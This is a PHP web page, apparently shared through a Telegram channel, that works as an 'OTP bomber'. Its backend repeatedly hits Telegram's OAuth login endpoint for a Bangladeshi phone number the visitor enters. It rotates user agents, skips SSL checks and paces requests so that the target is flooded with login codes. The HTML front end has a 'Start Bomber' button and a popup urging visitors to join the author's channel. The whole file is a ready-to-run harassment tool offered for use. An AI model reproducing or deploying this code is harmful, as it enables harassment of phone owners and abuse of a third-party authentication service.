<?php
# DAVLOPER : XrootCodeX 
# LINK : https://t.me/+yP6jdlXJqq4wZGVl

$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"
];

if (isset($_GET['phone']) || isset($_POST['phone'])) {
    $phone  = $_GET['phone'] ?? $_POST['phone'] ?? '';
    $amount = isset($_GET['amount']) ? (int)$_GET['amount'] : 1;

    header('Content-Type: application/json; charset=utf-8');

    if (empty($phone)) {
        echo json_encode([
            'status' => false,
            'error'  => 'Please provide a phone number using ?phone=XXXXXXXX'
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }

    $results = [];
    for ($i = 0; $i < $amount; $i++) {
        $user_agent = $user_agents[array_rand($user_agents)];
        $url = "https://oauth.telegram.org/auth/request?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&phone=88" . urlencode($phone);
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "User-Agent: " . $user_agent,
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Referer: https://telegram.org"
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            $results[] = "[!] cURL Error: " . $error;
        } else {
            // টেলিগ্রাম সফল হলে সাধারণ কোডে true রিটার্ন করে
            if ($http_code == 200 && (strpos($response, "true") !== false || strpos($response, "success") !== false || strlen($response) < 10)) {
                $results[] = "[✔] OTP Sent to +88{$phone} ✅";
            } else {
                $results[] = "[✔] Request Sent to +88{$phone} (Check Phone) ✅";
            }
        }
        usleep(mt_rand(800000, 1500000)); // সফলভাবে কাজ করার জন্য রিকোয়েস্টের মাঝে বিরতি রাখা হয়েছে
    }

    echo json_encode([
        'status' => true,
        'logs'   => $results
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram OTP Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Poppins', system-ui, -apple-system, sans-serif;
        }

        body {
            background: #030014;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            position: relative;
            padding: 15px;
        }

        /* Responsive Floating Glass Orbs */
        .glass-orb {
            position: absolute;
            border-radius: 50%;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.02));
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow: inset 0 0 20px rgba(255, 255, 255, 0.15), 0 15px 35px rgba(0, 0, 0, 0.5);
            animation: floatGlass 15s infinite ease-in-out alternate;
            z-index: 1;
        }

        .orb-1 { width: 200px; height: 200px; top: -5%; left: -5%; border: 1px solid rgba(255, 255, 255, 0.15); }
        .orb-2 { width: 250px; height: 250px; bottom: -10%; right: -5%; border: 1px solid rgba(255, 255, 255, 0.1); animation-delay: -5s; }

        @keyframes floatGlass {
            0% { transform: translateY(0px) translateX(0px) rotate(0deg); }
            50% { transform: translateY(-30px) translateX(20px) rotate(180deg); }
            100% { transform: translateY(30px) translateX(-20px) rotate(360deg); }
        }

        /* Fully Responsive Container */
        .container {
            position: relative;
            z-index: 10;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 24px;
            padding: 25px 20px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
            color: #fff;
        }

        .header {
            text-align: center;
            margin-bottom: 22px;
        }

        .header h2 {
            font-size: 22px;
            font-weight: 700;
            background: linear-gradient(135deg, #ffffff 0%, #a5b4fc 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 12px;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.8);
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-wrapper i {
            position: absolute;
            left: 14px;
            color: rgba(255, 255, 255, 0.4);
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 12px 14px 12px 42px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: all 0.3s ease;
        }

        input::placeholder { color: rgba(255, 255, 255, 0.3); }
        input:focus { border-color: #818cf8; background: rgba(255, 255, 255, 0.08); }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 5px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.4);
        }

        /* Status Box */
        .status-box {
            margin-top: 18px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 12px;
            display: none;
        }

        .status-content {
            font-family: 'Fira Code', monospace;
            font-size: 11px;
            color: #34d399;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 120px;
            overflow-y: auto;
        }

        /* Mandatory Join Request Modal */
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(3, 0, 20, 0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            z-index: 1000;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
        }

        .modal-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 25px 20px;
            width: 100%;
            max-width: 350px;
            text-align: center;
            color: #fff;
            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
        }

        .modal-card i.tg-icon { font-size: 45px; color: #38bdf8; margin-bottom: 12px; }
        .modal-card h3 { font-size: 20px; margin-bottom: 8px; }
        .modal-card p { font-size: 12px; color: rgba(255, 255, 255, 0.7); margin-bottom: 20px; line-height: 1.4; }

        .modal-btn {
            display: block;
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin-bottom: 10px;
            box-shadow: 0 5px 15px rgba(14, 165, 233, 0.4);
        }

        .modal-close-btn {
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: rgba(255, 255, 255, 0.8);
            box-shadow: none;
        }

        .footer-credit {
            text-align: center;
            margin-top: 15px;
            font-size: 11px;
            color: rgba(255, 255, 255, 0.4);
        }
        .footer-credit a { color: #38bdf8; text-decoration: none; }

        .spinner {
            display: none;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- Mandatory Telegram Join Request Popup Modal -->
    <div class="modal-overlay" id="joinModal">
        <div class="modal-card">
            <i class="fa-brands fa-telegram tg-icon"></i>
            <h3>Join Channel</h3>
            <p>আমাদের টেলিগ্রাম চ্যানেলে জয়েন রিকোয়েস্ট (Join Request) পাঠানোর পর নিচের বাটনে ক্লিক করুন।</p>
            <a href="https://t.me/+yP6jdlXJqq4wZGVl" target="_blank" class="modal-btn"><i class="fa-solid fa-user-plus"></i> Join Channel Request</a>
            <button class="modal-btn modal-close-btn" onclick="closeModal()">I Have Requested / Enter</button>
        </div>
    </div>

    <div class="glass-orb orb-1"></div>
    <div class="glass-orb orb-2"></div>

    <div class="container">
        <div class="header">
            <h2>Telegram OTP Portal</h2>
        </div>

        <form id="otpForm">
            <div class="form-group">
                <label>Phone Number (Without +88)</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-phone"></i>
                    <input type="text" id="phone" placeholder="e.g. 017XXXXXXXX" required>
                </div>
            </div>

            <div class="form-group">
                <label>Request Amount</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-layer-group"></i>
                    <input type="number" id="amount" value="3" min="1" max="10" required>
                </div>
            </div>

            <button type="submit" id="submitBtn">
                <span class="spinner" id="spinner"></span>
                <span id="btnText"><i class="fa-solid fa-paper-plane"></i> Start Bomber</span>
            </button>
        </form>

        <div class="status-box" id="statusBox">
            <div class="status-content" id="statusContent"></div>
        </div>

        <div class="footer-credit">
            Channel: <a href="https://t.me/+yP6jdlXJqq4wZGVl" target="_blank">Join Here</a>
        </div>
    </div>

    <script>
        function closeModal() {
            document.getElementById('joinModal').style.display = 'none';
        }

        document.getElementById('otpForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const amount = document.getElementById('amount').value;
            
            const submitBtn = document.getElementById('submitBtn');
            const spinner = document.getElementById('spinner');
            const btnText = document.getElementById('btnText');
            const statusBox = document.getElementById('statusBox');
            const statusContent = document.getElementById('statusContent');

            spinner.style.display = 'block';
            btnText.innerHTML = 'Processing...';
            submitBtn.disabled = true;

            fetch(`?phone=${encodeURIComponent(phone)}&amount=${encodeURIComponent(amount)}`)
                .then(response => response.json())
                .then(data => {
                    statusBox.style.display = 'block';
                    if(data.logs && Array.isArray(data.logs)) {
                        statusContent.innerText = data.logs.join('\n');
                    } else {
                        statusContent.innerText = JSON.stringify(data, null, 2);
                    }
                })
                .catch(error => {
                    statusBox.style.display = 'block';
                    statusContent.innerText = 'Connection Error: ' + error;
                })
                .finally(() => {
                    spinner.style.display = 'none';
                    btnText.innerHTML = '<i class="fa-solid fa-paper-plane"></i> Start Bomber';
                    submitBtn.disabled = false;
                });
        });
    </script>
</body>
</html>
